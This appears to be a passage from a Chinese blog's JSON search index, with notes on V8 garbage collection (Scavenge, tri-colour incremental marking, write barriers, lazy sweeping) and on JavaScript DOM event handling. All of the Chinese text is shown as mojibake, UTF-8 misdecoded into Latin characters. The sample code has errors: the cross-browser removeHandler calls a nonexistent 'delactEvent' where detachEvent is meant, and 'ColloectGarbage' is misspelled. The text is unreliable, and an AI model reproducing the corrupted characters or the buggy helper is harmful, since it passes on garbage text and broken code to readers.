ä¸¤ä¸ªå†…å­˜åŒºåŸŸå›æ”¶é¢‘ç‡ä¸åŒï¼ŒV8æ‰æœ‰ä¸¤ä¸ªåƒåœ¾å›æ”¶å™¨ç®¡æ§ï¼š        æ–°ç”Ÿä»£åƒåœ¾å›æ”¶    â€‹\tCheneyç®—æ³•ï¼Œå°†å †å†…å­˜åˆ†ä¸ºä¸¤ä¸ªåŒºï¼ˆsemispace åŠç©ºé—´ï¼‰ï¼šä¸€ä¸ªä½¿ç”¨çŠ¶æ€çš„ç©ºé—´æˆ‘ä»¬ç§°ä¸ºä½¿ç”¨åŒºï¼ˆFrom ç©ºé—´ï¼‰ã€‚ä¸€ä¸ªå¤„äºé—²ç½®çŠ¶æ€çš„ç©ºé—´ç§°ä¸ºç©ºé—²åŒºï¼ˆTo ç©ºé—´ï¼‰    åƒåœ¾å›æ”¶æœºåˆ¶â€”â€”ç¿»è½¬ ï¼ˆScavengeï¼‰          å…ˆå¯¹ä½¿ç”¨åŒºä¸­çš„æ´»åŠ¨åšæ ‡è®°      æ ‡è®°å®Œæˆåï¼Œå°†ä½¿ç”¨åŒºçš„æ´»åŠ¨å¯¹è±¡å¤åˆ¶è¿›ç©ºé—²åŒºå¹¶è¿›è¡Œæ’åº      å°†åŸå…ˆä½¿ç”¨åŒºå¯¹è±¡å ç”¨çš„ç©ºé—´é‡Šæ”¾      æœ€åè¿›è¡Œè§’è‰²äº’æ¢ï¼ŒæŠŠç©ºé—²åŒºå˜ä¸ºä½¿ç”¨åŒºï¼Œä½¿ç”¨åŒºå˜ä¸ºç©ºé—²åŒº        ç¼ºç‚¹ï¼šç”±äºåªèƒ½ä½¿ç”¨å †å†…å­˜çš„ä¸€åŠï¼Œæ‰€ä»¥ä¸é€‚ç”¨å¤§è§„æ¨¡çš„åƒåœ¾å›æ”¶æœºåˆ¶ä¸­ï¼Œæ˜¯å…¸å‹çš„ç‰ºç‰²ç©ºé—´æ¢æ—¶é—´çš„ç®—æ³•ã€‚ â€”â€” æ–°ç”Ÿä»£å†…å­˜ç©ºé—´è¾ƒå°ã€ç”Ÿå‘½å‘¨æœŸçŸ­ï¼ˆæ´»å¯¹è±¡å°‘ï¼‰    å¹¶è¡Œå›æ”¶    Javascriptæ˜¯ä¸€é—¨å•çº¿ç¨‹è¯­è¨€ï¼Œå®ƒæ˜¯è¿è¡Œåœ¨ä¸»çº¿ç¨‹ä¸Šçš„ï¼Œè€Œåœ¨è¿›è¡Œåƒåœ¾å›æ”¶çš„æ—¶å€™å°±ä¼šé˜»å¡Javascriptè„šæœ¬çš„æ‰§è¡Œï¼Œéœ€ç­‰å¾…åƒåœ¾å›æ”¶å®Œæ¯•åå†æ¢å¤è„šæœ¬æ‰§è¡Œï¼Œè¿™ç§è¡Œä¸ºå«å…¨åœé¡¿ã€‚    é‚£å½“GCæ—¶é—´è¿‡é•¿å°±ä¼šé€ æˆé¡µé¢å¡é¡¿é—®é¢˜ã€‚    é‚£ä¸€ä¸ªäººå¹²æ´»æ…¢ï¼Œnä¸ªäººä¸€èµ·é€Ÿåº¦ä¾¿ä¼šæ˜¯ä¸€ä¸ªäººçš„nå€ã€‚ç¨‹åºä¹Ÿä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡    å¹¶è¡Œå›æ”¶æœºåˆ¶ï¼šå¼•å…¥å¤šä¸ªè¾…åŠ©çº¿ç¨‹æ¥åŒæ—¶å¤„ç†æ–°ç”Ÿä»£å¯¹è±¡ç©ºé—´å°±é‡‡ç”¨å¹¶è¡Œç­–ç•¥ã€‚åœ¨åƒåœ¾å›æ”¶è¿‡ç¨‹ä¸­ï¼Œ    å¯åŠ¨å¤šä¸ªçº¿ç¨‹æ¥è´Ÿè´£æ–°ç”Ÿä»£ä¸­çš„åƒåœ¾æ¸…ç†ï¼Œè¿™äº›çº¿ç¨‹åŒæ—¶å°†å¯¹è±¡ç©ºé—´ä¸­çš„æ•°æ®ç§»åˆ°ç©º22    ç”±äºè¿™ä¸ªè¿‡ç¨‹ä¸­æ•°æ®åœ°å€ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥è¿˜éœ€è¦åŒæ­¥æ›´æ–°å¼•ç”¨è¿™äº›å¯¹è±¡çš„æŒ‡é’ˆã€‚    æ–°ç”Ÿä»£ä½•æ—¶ä¼šåˆ°è€ç”Ÿä»£          å¤šæ¬¡å¤åˆ¶åä¾ç„¶å­˜æ´»çš„å¯¹è±¡ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ç”Ÿå‘½å‘¨æœŸæ•™å¼ºçš„å¯¹è±¡ï¼Œç§»åˆ°è€ç”Ÿä»£ç®¡ç†      å¤åˆ¶ä¸€ä¸ªå¯¹è±¡åœ¨ç©ºé—²åŒºæ—¶ï¼Œå ç”¨ç©ºé—²åŒºç©ºé—´çš„25%ï¼Œåˆ™ç§»åˆ°è€ç”Ÿä»£ç®¡ç† â€”â€” å½“å®ŒæˆScavengeå›æ”¶ï¼Œç©ºé—´åŒºå˜ä¸ºä½¿ç”¨åŒºï¼Œä¼šç»§ç»­å‚ä¸å†…å­˜åˆ†é…ï¼Œæ¯”é‡è¿‡å¤§å½±å“åç»­å†…å­˜åˆ†é…        è€ç”Ÿä»£åƒåœ¾å›æ”¶    â€‹\tè€ç”Ÿä»£æ•°æ®å¤§å¤šæ˜¯å­˜æ´»çš„å¯¹è±¡ï¼Œä¸éœ€è¦æ—¶å¸¸æ›´æ–°ï¼Œå¯ä»¥ä½¿ç”¨ æ ‡è®°æ¸…æ”¶æ³• å›æ”¶ã€‚åœ¨V8ä¸­ä½¿ç”¨ æ ‡è®°æ•´ç†æ³• è§£å†³æ ‡è®°æ¸…é™¤åäº§ç”Ÿçš„å¤§é‡å†…å­˜ç¢ç‰‡ã€‚    å¢é‡æ ‡è®° ï¼ˆincremental markingï¼‰    â€‹\tä»£æ›¿ å¹¶è¡Œç­–ç•¥çš„å…¨åœé¡¿å¼ çš„åƒåœ¾å›æ”¶ï¼ŒèŠ‚çœæ¸…é™¤è¾ƒå¤§å¯¹è±¡çš„è€ç”Ÿä»£çš„æ—¶é—´é—®é¢˜          ä¸€æ¬¡GCåˆ†æˆå¤šæ­¥å°GCæ ‡è®°ï¼Œè®©JSå’Œå°GCæ ‡è®°äº¤æ›¿æ‰§è¡Œï¼Œç›´åˆ°æ ‡è®°å®Œæˆã€‚      åº”ç”¨é€»è¾‘æ‰§è¡Œä¸€ä¼šï¼Œåƒåœ¾å›æ”¶ä¸åº”ç”¨é€»è¾‘äº¤æ›¿æ‰§è¡Œç›´åˆ°æ ‡è®°é˜¶æ®µå®Œæˆ              å­˜åœ¨é—®é¢˜ï¼š      â€‹\tå°GCæ ‡è®°æ‰§è¡Œå®Œåæ˜¯å¦‚ä½•æš‚åœæ‰§è¡ŒJSä»»åŠ¡ï¼Ÿâ€”â€” ä¸‰è‰²æ ‡è®°æ³•      â€‹\tå¦‚ä½•è¿›è¡Œä¸‹ä¸€æ¬¡å°GC æ ‡è®°ï¼Ÿâ€”â€” æƒ°æ€§æ¸…ç†      â€‹\tå¦‚æœæ‰§è¡ŒJSä»»åŠ¡æ—¶åˆšè¢«æ ‡è®°å¥½çš„å¯¹è±¡å¼•ç”¨åˆè¢«ä¿®æ”¹äº†è¯¥å½“å¦‚ä½•ï¼Ÿ â€”â€” å†™å±éšœ        ä¸‰è‰²æ ‡è®°æ³•          é»‘è‰²è¡¨ç¤ºå¯¹è±¡è‡ªèº«åŠå¯¹è±¡çš„å¼•ç”¨éƒ½è¢«æ ‡è®°ï¼ˆå·²æ£€æŸ¥çŠ¶æ€ï¼‰      ç™½è‰²è¡¨ç¤ºæœªè¢«æ ‡è®°çš„å¯¹è±¡ï¼ˆåˆå§‹çŠ¶æ€ï¼‰      ç°è‰²è¡¨ç¤ºè‡ªèº«è¢«æ ‡è®°ï¼Œè‡ªèº«çš„å¼•ç”¨æœªè¢«æ ‡è®°ï¼ˆå¾…æ£€æŸ¥çŠ¶æ€ï¼‰        æ‰§è¡Œæµç¨‹ï¼š          åˆå§‹æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯ç™½è‰²      ä»rootå¯¹è±¡å¼€å§‹ã€æ ‡è®°ä¸ºç°è‰²ï¼Œå¹¶æ¨å…¥æ ‡è®°å·¥ä½œè¡¨ä¸­ï¼›      å½“æ”¶é›†å™¨ä»æ ‡è®°å·¥ä½œè¡¨ä¸­å¼¹å‡ºå¯¹è±¡ï¼Œå¹¶è®¿é—®å®ƒæ‰€æœ‰å¼•ç”¨å¯¹è±¡æ—¶ï¼Œè‡ªèº«ç°è‰²å°±ä¼šå˜æ¢æˆé»‘è‰²      å°†è‡ªèº«çš„ä¸‹ä¸€ä¸ªå¼•ç”¨å¯¹è±¡æ ‡å¿—ä¸ºç°è‰²        ä¸€ç›´æ‰§è¡Œï¼Œç›´åˆ°æ²¡æœ‰å¯ä»¥è¢«æ ‡è®°ä¸ºç°è‰²çš„å¯¹è±¡ï¼Œå‰©ä¸‹çš„ç™½è‰²å¯¹è±¡éƒ½æ˜¯ä¸å¯è¾¾çš„ï¼Œè¿›å…¥æ¸…é™¤é˜¶æ®µï¼›    æ¢å¤æ—¶ï¼Œä»ç°è‰²æ ‡è®°å¯¹è±¡å¼€å§‹æ‰§è¡Œ    å†™å±éšœ    ç›®çš„ï¼š          è§£å†³é»‘è‰²å¯¹è±¡åœ¨ç¨‹åºæ‰§è¡Œä¸­è¢«æ–°æ·»åŠ å¼•ç”¨      å·²ç»æ ‡è®°é»‘è‰²çš„è¢«å¼•ç”¨å¯¹è±¡ä¸å†è¢«å¼•ç”¨äº†        å†™å±éšœå°±æœ‰äº†ä»¥ä¸‹ä¸¤ä¸ªå˜åŒ–ï¼š    â€‹\t1. ä¸å¯¹å·²æ ‡è®°çš„é»‘è‰²å¯¹è±¡åšå¤„ç†ï¼Œå› ä¸ºåœ¨ä¹‹åçš„GCä¸­ä¹Ÿä¼šè¢«æ¸…ç†ã€‚          Write-barrier æœºåˆ¶å¼ºåˆ¶ä¸å˜é»‘çš„å¯¹è±¡æŒ‡å‘ç™½è‰²å¯¹è±¡ã€‚                  è¿™ä¸ªä¹Ÿè¢«ç§°ä½œå¼ºä¸‰è‰²ä¸å˜æ€§ã€‚æ‰€ä»¥          ä¸€æ—¦æœ‰é»‘è‰²å¯¹è±¡å¼•ç”¨ç™½è‰²å¯¹è±¡ï¼Œè¯¥æœºåˆ¶ä¼šå¼ºåˆ¶å°†å¼•ç”¨çš„ç™½è‰²å¯¹è±¡æ”¹ä¸ºç°è‰²          ä»è€Œä¿è¯ä¸‹ä¸€æ¬¡å¢é‡ GC æ ‡è®°é˜¶æ®µå¯ä»¥æ­£ç¡®æ ‡è®°                      æƒ°æ€§æ¸…ç† ï¼ˆlazy sweepingï¼‰    â€‹\tå¢é‡æ ‡è®°å®Œåï¼Œå¦‚æœå½“å‰å†…å­˜è¶³ä»¥æ”¯æŒä»£ç çš„å¿«é€Ÿè¿è¡Œï¼Œä¹Ÿæ²¡å¿…è¦ç«‹å³æ¸…ç†ï¼Œå¯è®©ç¨‹åºå…ˆè¿è¡Œï¼Œä¹Ÿæ— éœ€ä¸€æ¬¡æ€§æ¸…ç†å®Œæ‰€æœ‰åƒåœ¾å¯¹è±¡ï¼Œå¯ä»¥æŒ‰éœ€æ¸…ç†ç›´åˆ°æ‰€æœ‰åƒåœ¾å¯¹è±¡æ¸…ç†å®Œåå†ç»§ç»­å¢é‡æ ‡è®°ã€‚    V8 script éšè—ç±»    JS æ€§èƒ½ä¼˜åŒ– â€”â€“ V8 éšè—ç±»    â€‹\tâ€œä¸€æ¬¡æ€§å£°æ˜â€ï¼šé¿å…ç”Ÿæˆä¸åŒçš„éšè—ç±»ï¼Œâ€œå…ˆåˆ›å»ºå†è¡¥å……â€å¼åŠ¨æ€å±æ€§èµ‹å€¼ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°ä¸­ä¸€æ¬¡æ€§å£°æ˜æ‰€æœ‰å±æ€§    â€‹\tâ€œç½®ç©ºä¸åˆ é™¤â€ï¼šåŠ¨æ€åˆ é™¤å±æ€§å’Œæ–°å¢å±æ€§ä¸€æ ·ï¼Œä½¿å¾—åŒä¸€ä¸ªæ„é€ å‡½æ•°å‡ºæ¥çš„å®ä¾‹ä¸å†å…±äº«éšè—ç±»ã€‚æœ€ä½³æ–¹æ¡ˆæ˜¯ = null    ä¼˜åŒ–ç¨‹åºå›æ”¶ï¼Œæé«˜æ€§èƒ½          æ‰‹åŠ¨å›æ”¶ï¼ˆä¸å»ºè®®ï¼‰ï¼šwindow.ColloectGarbage()ï¼ˆIEï¼‰ã€window.opera.collect()ï¼ˆopera7ä»¥ä¸Šï¼‰ç«‹å³å¯åŠ¨åƒåœ¾å›æ”¶ï¼›      è§£é™¤å¼•ç”¨ï¼šå°†ä¸éœ€è¦çš„æ•°æ®è®¾ç½®ä¸ºnullï¼Œé‡Šæ”¾å…¶å¼•ç”¨ï¼Œåœ¨ä¸‹æ¬¡å›æ”¶æ—¶é‡Šæ”¾å†…å­˜ã€‚      1. ä½¿ç”¨ å—çº§ä½œç”¨åŸŸ ï¼Œå°½æ—©è®©åƒåœ¾å›æ”¶ç¨‹åºä»‹å…¥ã€‚      "
  },
  
  {
    "title": "10. äº‹ä»¶",
    "url": "/posts/10.%E4%BA%8B%E4%BB%B6/",
    "categories": "JavaScript, Event",
    "tags": "javascriptBase",
    "date": "2022-09-02 00:00:00 +0800",
    





    
    "snippet": "  JavaScript ä¸ HTML äº¤äº’é€šè¿‡ äº‹ä»¶ å®ç°ï¼›ä»£è¡¨æ–‡æ¡£document æˆ– æµè§ˆå™¨çª—å£ä¸­æŸä¸ªæ„ä¹‰çš„æ—¶åˆ»  ç›‘å¬å™¨ ï¼Œè®¢é˜…äº‹ä»¶ï¼ˆå¤„ç†ç¨‹åºï¼‰ ç›‘å¬äº‹ä»¶å‘ç”Ÿæ—¶æ‰§è¡Œ  è§¦å‘äº‹ä»¶ä»¥æµ‹è¯•ï¼šdispatchEvent()äº‹ä»¶æµâ€‹\täº‹ä»¶æµæè¿°äº†é¡µé¢æ¥å—äº‹ä»¶çš„é¡ºåº  IE æ”¯æŒäº‹ä»¶å†’æ³¡æµ          IEäº‹ä»¶æµè¢«ç§°ä¸ºäº‹ä»¶å†’æ³¡      äº‹ä»¶ä»æœ€å…·ä½“çš„å…ƒç´ ï¼ˆæ–‡æ¡£æ ‘ä¸­æœ€æ·±çš„èŠ‚ç‚¹ï¼‰å¼€å§‹å‡ºå‘ï¼Œç„¶...",
    "content": "  JavaScript ä¸ HTML äº¤äº’é€šè¿‡ äº‹ä»¶ å®ç°ï¼›ä»£è¡¨æ–‡æ¡£document æˆ– æµè§ˆå™¨çª—å£ä¸­æŸä¸ªæ„ä¹‰çš„æ—¶åˆ»  ç›‘å¬å™¨ ï¼Œè®¢é˜…äº‹ä»¶ï¼ˆå¤„ç†ç¨‹åºï¼‰ ç›‘å¬äº‹ä»¶å‘ç”Ÿæ—¶æ‰§è¡Œ  è§¦å‘äº‹ä»¶ä»¥æµ‹è¯•ï¼šdispatchEvent()äº‹ä»¶æµâ€‹\täº‹ä»¶æµæè¿°äº†é¡µé¢æ¥å—äº‹ä»¶çš„é¡ºåº  IE æ”¯æŒäº‹ä»¶å†’æ³¡æµ          IEäº‹ä»¶æµè¢«ç§°ä¸ºäº‹ä»¶å†’æ³¡      äº‹ä»¶ä»æœ€å…·ä½“çš„å…ƒç´ ï¼ˆæ–‡æ¡£æ ‘ä¸­æœ€æ·±çš„èŠ‚ç‚¹ï¼‰å¼€å§‹å‡ºå‘ï¼Œç„¶åå‘ä¸Šä¼ æ’­åˆ°æ²¡æœ‰é‚£ä¹ˆå…·ä½“çš„å…ƒç´ ï¼ˆDocumentï¼‰      IE5.5åŠæ—©æœŸç‰ˆæœ¬è·³è¿‡&lt;html&gt; (&lt;body&gt; -&gt; &lt;document&gt;)        Netscape Comuunicator æ”¯æŒäº‹ä»¶æ•è·æµ          äº‹ä»¶æ•è·ï¼šä¸ºåœ¨äº‹ä»¶è¾¾åˆ°æœ€ç»ˆç›®æ ‡å‰æ‹¦æˆªäº‹ä»¶ï¼ˆæ–°ç‰ˆæœ¬æµè§ˆå™¨éƒ½æ”¯æŒäº‹ä»¶æ•è·ï¼Œä½†æ—§ç‰ˆæœ¬ä¸æ”¯æŒï¼‰      æœ€ä¸å…·ä½“çš„èŠ‚ç‚¹æœ€å…ˆæ”¶åˆ°äº‹ä»¶ï¼Œè€Œå…·ä½“çš„èŠ‚ç‚¹æœ€åæ”¶åˆ°äº‹ä»¶ï¼›      ä»windowå¯¹è±¡å¼€å§‹æ•è·å¯¹è±¡ï¼ŒDOM2 Eventsä»documentå¼€å§‹        DOM äº‹ä»¶æµ          DOM2 Events è§„å®šäº‹ä»¶åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼›äº‹ä»¶æ•è·ã€åˆ°è¾¾ç›®æ ‡ã€äº‹ä»¶å†’æ³¡      IE9 ä¹‹åçš„æµè§ˆå™¨éƒ½æ”¯æŒDOMäº‹ä»¶æµï¼Œä½†ä¼šåœ¨æ•è·é˜¶æ®µåœ¨äº‹ä»¶ç›®æ ‡ä¸Šè§¦å‘äº‹ä»¶ â€”â€” äº‹ä»¶ç›®æ ‡æœ‰ä¸¤ä¸ªæ—¶æœºå¤„ç†äº‹ä»¶ã€‚      äº‹ä»¶å¤„ç†ç¨‹åºâ€‹\tä¸ºå“åº”äº‹ä»¶è€Œè°ƒç”¨çš„å‡½æ•°è¢«ç§°ä¸º äº‹ä»¶å¤„ç†ç¨‹åºï¼ˆäº‹ä»¶ç›‘å¬å™¨ï¼‰ï¼Œåå­—å¸¸ä»¥onå¼€å¤´ï¼Œé›†åˆå¤šä¸ªå¤„ç†ç¨‹åºåç§°ä»¥handleç»“å°¾HTMLâ€‹\tå±æ€§å€¼æ˜¯JavaScriptä»£ç ï¼Œéœ€è¦ç»è¿‡è½¬ä¹‰çš„æƒ…å†µä¸‹ä½¿ç”¨HTMLè¯­æ³•å­—ç¬¦&lt;input type=\"button\" value=\"ç‚¹å‡»æŒ‰é’®è§¦å‘äº‹ä»¶\" onclick=\"console.log('Clicked!')\"/&gt;&lt;!-- è½¬ä¹‰ æ·»åŠ ç©ºæ ¼ --&gt;&lt;input type=\"button\" value=\"ç‚¹å‡»æŒ‰é’®è§¦å‘äº‹ä»¶\" onclick=\"console.log('&amp;quote;Clicked!&amp;quote;')\"/&gt;&lt;!-- è°ƒç”¨å…¶ä»–åœ°æ–¹è„šæœ¬ --&gt;&lt;input type=\"button\" value=\"ç‚¹å‡»æŒ‰é’®è§¦å‘äº‹ä»¶\" onclick=\"showMessage()\"/&gt;ğŸ’¬ è°ƒç”¨å¤–éƒ¨è„šæœ¬showMessageï¼Œå­˜åœ¨ä»¥ä¸‹ç‰¹æ®Šçš„å±€éƒ¨å˜é‡ï¼š  ç‰¹æ®Šå±€éƒ¨å˜é‡ eventå¯¹è±¡  thiså€¼ç›¸å½“äºäº‹ä»¶çš„ç›®æ ‡å…ƒç´   æ‰©å±•ä½œç”¨åŸŸé“¾ï¼šdocument å’Œ å…ƒç´ è‡ªèº«æˆå‘˜ğŸ’¬ åœ¨ HTML ä¸­æŒ‡å®šäº‹ä»¶å¤„ç†ç¨‹åºï¼Œå­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š      ä½œç”¨åŸŸæ‰©å±•åœ¨ä¸åŒæµè§ˆå™¨ä¸­å¯ä»¥å¯¼è‡´ä¸åŒç»“æœï¼ŒèŒƒå›´æ— é™å®šçš„å¯¹è±¡å¯èƒ½å¯¼è‡´é”™è¯¯        è°ƒç”¨æ—¶æœºï¼šå…ƒç´ ç”Ÿæˆåœ¨å‰ï¼Œç›‘å¬å™¨å®šä¹‰åœ¨åï¼Œç”¨æˆ·å·²ç»äº¤äº’è¿‡ï¼Œä¸ä¼šè§¦å‘ç›‘å¬å™¨ï¼Œä¼šå‘ç”Ÿé”™è¯¯ï¼›    ä¸ºæ­¤ï¼ŒHTML äº‹ä»¶å¤„ç†ç¨‹åºä¼šå°è£…åˆ°try/catchå—ä¸­ï¼Œä½¿è¿™ç§æƒ…å†µé™é»˜å¤±è´¥ â€”â€” æ•è·åœ¨å…ˆï¼Œå…ƒç´ å“åº”åœ¨å  &lt;input type=\"button\" value=\"ç‚¹å‡»æŒ‰é’®è§¦å‘äº‹ä»¶\" onclick=\"try{                                                    showMessage();                                                   } catch(ex){}                                                                                             \"/&gt;DOM0â€‹\tå°†ä¸€ä¸ªå‡½æ•°èµ‹å€¼ç»™ï¼ˆDOMå…ƒç´ çš„ï¼‰ä¸€ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºçš„å±æ€§ â€”â€” JavaScriptæŒ‡å®šä¹‹å‰å¿…é¡»å…ˆå–å¾—æ“ä½œå¯¹è±¡çš„å¼•ç”¨â€‹\tåœ¨è¿è¡Œä¹‹åæ‰ä¼šç»™äº‹ä»¶å¤„ç†ç¨‹åºèµ‹å€¼ï¼Œæ³¨å†Œåœ¨äº‹ä»¶æµçš„å†’æ³¡é˜¶æ®µlet btn = document.getElementById('myBtn'); btn.onclick = function(){ \t// å‡½æ•°è¢«è§†ä¸ºå…ƒç´ çš„æ–¹æ³•ï¼Œåœ¨å…ƒç´ ä½œç”¨åŸŸä¸­è¿è¡Œï¼›this = å…ƒç´     console.log('Clicked!')}// å°†å±æ€§å€¼è®¾ç½®ä¸ºnullï¼Œç§»é™¤DOM0æ–¹å¼æ·»åŠ çš„äº‹ä»¶å¤„ç†ç¨‹åºbtn.onclick = null;DOM2â€‹\tæä¾›ä¸¤ä¸ªæ–¹æ³•å¤„ç†ç¨‹åºï¼šæ–°å¢ addEventListener() ç§»é™¤removeEventListenerï¼Œæš´éœ²åœ¨æ‰€æœ‰DOMèŠ‚ç‚¹ä¸Šã€‚â€‹\tæ¥å—ä¸‰ä¸ªå‚æ•°ï¼šäº‹ä»¶åï¼ˆclickï¼‰ã€äº‹ä»¶å¤„ç†å‡½æ•°ã€å¸ƒå°”å€¼ï¼ˆfalse é»˜è®¤å€¼ï¼Œå†’æ³¡é˜¶æ®µè°ƒç”¨ï¼›true æ•è·é˜¶æ®µè°ƒç”¨ï¼‰â€‹\tä½¿ç”¨addEventListeneræ·»åŠ çš„ç›‘è§†å™¨ï¼Œå¿…é¡»ä½¿ç”¨removeEventListenerå¹¶ä¼ å…¥æ·»åŠ æ—¶ç›¸åŒå‚æ•°æ¥ç§»é™¤ â€”â€” åŒ¿åå‡½æ•°æ— æ³•ç§»é™¤ã€‚â€‹\tä¸»è¦ä¼˜åŠ¿ï¼šå¯ä»¥ä¸ºåŒä¸€ä¸ªäº‹ä»¶æ·»åŠ å¤šä¸ªäº‹ä»¶å¤„ç†ç¨‹åºï¼Œé¡ºåºè§¦å‘ã€‚â€‹\täº‹ä»¶å¤„ç†ç¨‹åºé€šå¸¸ä¼šè¢«æ·»åŠ åˆ°äº‹ä»¶æµçš„å†’æ³¡é˜¶æ®µï¼ˆä¸»è¦åŸå› æ˜¯è·¨æµè§ˆå™¨å…¼å®¹æ€§å¥½ï¼‰ï¼Œæ³¨å†Œåˆ°æ•è·é˜¶æ®µå‚ä¸äºäº‹ä»¶åˆ°è¾¾æŒ‡å®šç›®æ ‡ä¹‹å‰æ‹¦æˆªã€‚IEâ€‹\tæä¾›ä¸¤ä¸ªæ–¹æ³•å¤„ç†ç¨‹åºï¼šæ–°å¢  attachEvent ç§»é™¤ detachEventï¼Œæš´éœ²åœ¨æ‰€æœ‰DOMèŠ‚ç‚¹ä¸Šã€‚â€‹\tæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šäº‹ä»¶åï¼ˆon+ clickï¼‰ã€äº‹ä»¶å¤„ç†å‡½æ•° â€”â€” IE8åŠä¹‹å‰åªæ”¯æŒäº‹ä»¶å†’æ³¡ï¼Œæ‰€æœ‰ä¼šæ·»åŠ åˆ°äº‹ä»¶å†’æ³¡é˜¶æ®µã€‚â€‹\tä½¿ç”¨ attachEventæ·»åŠ çš„ç›‘è§†å™¨ï¼Œå¿…é¡»ä½¿ç”¨detachEventå¹¶ä¼ å…¥æ·»åŠ æ—¶ç›¸åŒå‚æ•°æ¥ç§»é™¤ã€æˆ–ä¼ å…¥ç›‘è§†å™¨å¼•ç”¨â€”â€” åŒ¿åå‡½æ•°æ— æ³•ç§»é™¤ã€‚â€‹\tä¸DOM0åŒºåˆ«åœ¨äºï¼šthis = windowï¼Œç¨‹åºåœ¨å…¨å±€ä½œç”¨åŸŸä¸­è¿è¡Œï¼›â€‹\tåŒDOM2åŒæ ·å¯ä»¥ä¸ºåŒä¸€ä¸ªäº‹ä»¶æ·»åŠ å¤šä¸ªäº‹ä»¶å¤„ç†ç¨‹åºï¼Œé¡ºåºæ–¹å‘è§¦å‘è·¨æµè§ˆå™¨äº‹ä»¶å¤„ç†ç¨‹åºvar EventUtil = {    addHandler: function(element, type, handler){        if(element.addEventListener){ // DOM2            element.addEventListener(type, handler, false)        }else if(element.attachEvent){ // IE            element.attachEvent('on'+type, handler)       \t}else{ // DOM0            element['on'+type] = handler;        }    },    removeHandler: function(element, type, handler){        if(element.removeEventListener){ // DOM2            element.removeEventListener(type, handler, false)        }else if(element.delactEvent){ // IE            element.delactEvent('on'+type, handler)       \t}else{ // DOM0            element['on'+type] = null;        }    },}â— ä¾ç„¶æœªè§£å†³ä»¥ä¸‹é—®é¢˜ï¼š  IEçš„ä½œç”¨åŸŸé—®é¢˜  å¤šä¸ªäº‹ä»¶å¤„ç†ç¨‹åºé¡ºåºé—®é¢˜  DOM0 åªæ”¯æŒä¸€æ¬¡æ·»åŠ ä¸€ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºäº‹ä»¶å¯¹è±¡â€‹\täº‹ä»¶å‘ç”Ÿæ—¶ï¼Œæ‰€æœ‰ç›¸å…³ä¿¡æ¯ä¼šå­˜å‚¨åœ¨eventå¯¹è±¡ä¸­ã€‚åŒ…å«ï¼šäº‹ä»¶å…ƒç´ ã€äº‹ä»¶ç±»å‹ã€å¯èƒ½ä¸ç‰¹ç‚¹äº‹ä»¶ç›¸å…³çš„ä»»ä½•å…¶ä»–æ•°æ®ã€‚DOM äº‹ä»¶å¯¹è±¡â€‹\tåœ¨DOMä¸­ï¼ˆæ— è®ºæ˜¯DOM0 æˆ– DOM2ï¼‰ï¼Œeventå¯¹è±¡æ˜¯ä¼ é€’ç»™äº‹ä»¶å¤„ç†ç¨‹åºçš„å”¯ä¸€å‚æ•°ã€‚â€‹\teventå¯¹è±¡åªåœ¨äº‹ä»¶å¤„ç†ç¨‹åºæ‰§è¡ŒæœŸé—´å­˜åœ¨ï¼Œæ‰§è¡Œå®Œæ¯•å°±é”€æ¯ã€‚åŒ…å«ä»¥ä¸‹å…¬æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼š  target ç›¸å…³çš„å±æ€§â€‹\tåœ¨äº‹ä»¶å¤„ç†ç¨‹åºå†…éƒ¨ï¼Œthis = currentTargetï¼Œè€ŒtargetåªåŒ…å«äº‹ä»¶å®é™…ç›®æ ‡ã€‚â€‹\tå¦‚æœå¤„ç†ç¨‹æ·»åŠ åˆ°äº†æ„å›¾çš„ç›®æ ‡ï¼Œåˆ™this = currentTarget = target  é˜»æ­¢é»˜è®¤åŠ¨ä½œâ€‹\tpreventDefault() ç”¨äºé˜»æ­¢ç‰¹å®šäº‹ä»¶çš„é»˜è®¤åŠ¨ä½œï¼Œä¸”ä¸å½±å“äº‹ä»¶åç»­ä¼ æ’­ï¼›å‰ææ˜¯å…¶å¯¹è±¡çš„cancelable = trueï¼ˆå…è®¸å–æ¶ˆï¼‰â€‹\tstopPropagation() ç”¨ä»¥ç«‹å³é˜»æ­¢äº‹ä»¶æµåœ¨DOMç»“æ„çš„ä¼ æ’­ï¼Œå–æ¶ˆåç»­äº‹ä»¶çš„æ•è·å’Œå†’æ³¡ã€‚  eventPhase å±æ€§å¯ä»¥ç¡®å®šäº‹ä»¶æµå½“å‰æ‰€å¤„çš„é˜¶æ®µï¼š      1 â€”â€” äº‹ä»¶åœ¨æ•è·é˜¶æ®µè¢«è°ƒç”¨        2 â€”â€” äº‹ä»¶åœ¨ç›®æ ‡ä¸Šè¢«è°ƒç”¨        3 â€”â€” äº‹ä»¶åœ¨å†’æ³¡é˜¶æ®µè¢«è°ƒç”¨  IE äº‹ä»¶å¯¹è±¡â€‹\tIEä¸­çš„äº‹ä»¶å¯¹è±¡eventæ˜¯åŸºäºäº‹ä»¶å¤„ç†ç¨‹åºè¢«æŒ‡å®šçš„æ–¹å¼ä»¥ä¸åŒæ–¹å¼è®¿é—®ã€‚// DOM0æ–¹å¼æŒ‡å®šï¼Œeventå¯¹è±¡æ˜¯windowå¯¹è±¡çš„ä¸€ä¸ªå±æ€§ã€‚var btn = document.getElementById('myBtn');btn.onclick = function(){\tlet event = window.event; // event.type = 'click'    this === event.srcElement; // true è¿è¡Œåœ¨å‡½æ•°å†…éƒ¨}// IE æ–¹å¼æŒ‡å®šï¼Œeventå¯¹è±¡ä»ç„¶æ˜¯windowå¯¹è±¡çš„å±æ€§var btn = document.getElementById('myBtn');btn.attachEvent('onclick',function(event){    event.type; // 'click'    this === event.srcElement; // false è¿è¡Œåœ¨å…¨å±€ä½œç”¨åŸŸä¸‹})&lt;!-- HTML æ–¹å¼æŒ‡å®šï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨eventå¯¹è±¡è®¿é—® --&gt;&lt;input type=\"button\" value=\"ç‚¹å‡»è§¦å‘äº‹ä»¶\" onclick=\"console.log(event.type)\"/&gt;       